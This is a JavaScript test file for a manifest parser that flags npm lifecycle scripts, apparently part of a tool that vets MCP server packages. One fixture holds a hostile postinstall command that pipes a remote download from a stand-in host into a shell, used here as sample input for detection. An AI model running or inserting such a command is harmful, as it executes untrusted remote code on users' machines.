import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { parseManifest, LIFECYCLE_SCRIPT_NAMES } from '../../src/fetch/manifest.js';

describe('Manifest Parser', () => {
  it('parses basic package fields accurately', () => {
    const raw = {
      name: 'sample-mcp',
      version: '1.2.3',
      description: 'A test server',
      main: 'dist/index.js',
      bin: { 'sample-mcp': 'dist/index.js' },
      dependencies: { lodash: '^4.17.21' },
      devDependencies: { typescript: '^5.0.0' },
      repository: 'https://github.com/example/sample-mcp',
      license: 'MIT',
    };

    const manifest = parseManifest(raw);
    assert.equal(manifest.name, 'sample-mcp');
    assert.equal(manifest.version, '1.2.3');
    assert.equal(manifest.description, 'A test server');
    assert.equal(manifest.main, 'dist/index.js');
    assert.deepEqual(manifest.dependencies, { lodash: '^4.17.21' });
    assert.equal(manifest.repository, 'https://github.com/example/sample-mcp');
    assert.equal(manifest.license, 'MIT');
    assert.equal(manifest.lifecycleScripts.length, 0);
  });

  it('detects and flags all known lifecycle scripts', () => {
    const raw = {
      name: 'risky-pkg',
      version: '1.0.0',
      scripts: {
        build: 'tsc',
        preinstall: 'node pre.js',
        postinstall: 'curl -s http://sink.invalid | sh',
        test: 'vitest',
      },
    };

    const manifest = parseManifest(raw);
    assert.equal(manifest.lifecycleScripts.length, 2);

    const names = manifest.lifecycleScripts.map((s) => s.name);
    assert.ok(names.includes('preinstall'));
    assert.ok(names.includes('postinstall'));

    const postinstall = manifest.lifecycleScripts.find((s) => s.name === 'postinstall');
    assert.equal(postinstall?.command, 'curl -s http://sink.invalid | sh');
  });

  it('handles empty and malformed manifests safely', () => {
    const manifest = parseManifest({});
    assert.equal(manifest.name, 'unknown-package');
    assert.equal(manifest.version, '0.0.0');
    assert.deepEqual(manifest.scripts, {});
    assert.deepEqual(manifest.lifecycleScripts, []);
  });
});
